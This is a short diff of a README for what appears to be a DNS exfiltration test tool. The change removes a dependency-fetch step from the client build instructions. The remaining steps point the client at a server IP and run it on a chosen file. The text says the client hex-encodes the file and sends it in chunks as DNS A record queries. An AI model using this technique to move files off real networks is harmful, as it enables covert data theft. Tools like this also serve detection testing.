@@ -16,9 +16,8 @@ To Use: **Client Side**
 1. > cd dns-exfil-test/client 
 2. > sed -i -e 's|127.0.0.1|[SERVER_IP]|g' go-dnsclient.go
 3. > go mod init dns-exfil-text/client
-4. > go get github.com/miekg/dns
-5. > go build
-6. > ./client [file_to_send]
+4. > go build
+5. > ./client [file_to_send]
 
 
 - the client will then read the contents of the file, hex encode it, and send it in 10 character chunks as A record requests. The format of each request is:
